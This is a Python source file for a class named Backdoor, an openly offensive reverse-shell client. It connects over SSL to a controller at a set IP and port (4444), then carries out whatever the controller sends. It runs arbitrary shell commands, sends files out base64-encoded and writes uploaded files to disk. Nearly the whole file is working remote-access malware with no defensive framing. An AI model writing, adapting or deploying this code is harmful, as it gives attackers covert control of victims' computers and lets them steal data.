import socket
import subprocess
import json
import os
import base64
import ssl
from cryptography.fernet import Fernet

class Backdoor:
    def __init__(self, ip, port, key):
        self.key = key
        self.cipher = Fernet(key)
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        
        # Wrap the socket in SSL for encrypted communication
        self.connection = ssl.wrap_socket(self.connection)
        self.connection.connect((ip, port))
    
    def json_send(self, data):
        encrypted_data = self.cipher.encrypt(json.dumps(data).encode())
        self.connection.send(encrypted_data)
    
    def json_receive(self):
        json_data = b""
        while True:
            try:
                json_data += self.connection.recv(1024)
                decrypted_data = self.cipher.decrypt(json_data).decode()
                return json.loads(decrypted_data)
            except ValueError:
                continue
    
    def sys_command(self, command):
        try:
            return subprocess.check_output(command, shell=True)
        except subprocess.CalledProcessError as e:
            return f"[-] Error executing command: {str(e)}"
    
    def cd_method(self, path):
        try:
            os.chdir(path)
            return f"[+] Changing working directory to {path}"
        except FileNotFoundError as e:
            return f"[-] Error: {str(e)}"
    
    def read_file(self, path):
        try:
            with open(path, 'rb') as file:
                return base64.b64encode(file.read())
        except Exception as e:
            return f"[-] Error reading file: {str(e)}"
    
    def write_file(self, path, content):
        try:
            with open(path, "wb") as file:
                file.write(base64.b64decode(content))
            return "[+] Download successful."
        except Exception as e:
            return f"[-] Error writing file: {str(e)}"
    
    def run(self):
        while True:
            command = self.json_receive()
            try:
                if command[0] == "exit":
                    self.connection.close()
                    exit()
                elif command[0] == 'cd' and len(command) > 1:
                    command_result = self.cd_method(command[1])
                elif command[0] == "download":
                    command_result = self.read_file(command[1]).decode()
                elif command[0] == "upload":
                    command_result = self.write_file(command[1], command[2])
                else:
                    command_result = self.sys_command(command).decode()
            except Exception as e:
                command_result = f"[-] Error: {str(e)}"
            self.json_send(command_result)

if __name__ == "__main__":
    ip = "192.168.1.100"  # Example IP, make sure to replace or pass as an argument
    port = 4444  # Example Port, make sure to replace or pass as an argument
    key = Fernet.generate_key()  # For demonstration purposes; securely share this key
    
    my_backdoor = Backdoor(ip, port, key)
    my_backdoor.run()
